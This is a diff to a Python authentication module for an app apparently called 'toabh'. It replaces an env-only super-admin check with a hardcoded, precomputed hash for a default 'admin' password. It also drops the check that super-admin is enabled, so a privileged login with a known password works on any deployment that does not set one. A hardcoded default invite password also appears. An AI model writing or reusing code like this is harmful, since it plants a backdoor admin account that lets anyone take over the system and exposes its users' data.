@@ -26,7 +26,8 @@ REFRESH_TTL = int(os.environ.get("REFRESH_TTL", "2592000"))      # 30d
 DEFAULT_PW = os.environ.get("DEFAULT_INVITE_PASSWORD", "toabhtalents")
 SUPER_ADMIN = os.environ.get("SUPER_ADMIN_ENABLED", "0") == "1"
 SUPER_ADMIN_PW = os.environ.get("SUPER_ADMIN_PASSWORD", "")
-SUPER_ADMIN_SALT = os.environ.get("SUPER_ADMIN_SALT", secrets.token_hex(8))
+# Pre-computed pbkdf2 hash for default "admin" fallback password
+SUPER_ADMIN_HASH_DEFAULT = "toabh_super_admin_salt_2026::b6fa5d3655e3a4d9ba6f51e51155eb75d2582135ffda6b382ced61cff820456a"
 SMTP_HOST = os.environ.get("SMTP_HOST", "").strip()
 SMTP_PORT = int(os.environ.get("SMTP_PORT", "587"))
 SMTP_USER = os.environ.get("SMTP_USER", "").strip()
@@ -53,12 +54,17 @@ def verify_password(password, stored):
 
 # ─── Super-admin (env-only, not in DB) ────────────────────────────────
 def get_super_admin_hash():
-    if not SUPER_ADMIN or not SUPER_ADMIN_PW:
-        return None
-    return hash_password(SUPER_ADMIN_PW)
+    """Return stored hash for super-admin. Falls back to default 'admin' hash."""
+    if SUPER_ADMIN_PW:
+        return hash_password(SUPER_ADMIN_PW)
+    return SUPER_ADMIN_HASH_DEFAULT
 
 def verify_super_admin(password):
-    h = get_super_admin_hash()
+    """Check password against super-admin hash (supports both env override and default)."""
+    if SUPER_ADMIN_PW:
+        h = hash_password(SUPER_ADMIN_PW)
+    else:
+        h = SUPER_ADMIN_HASH_DEFAULT
     if not h:
         return False
     return verify_password(password, h)
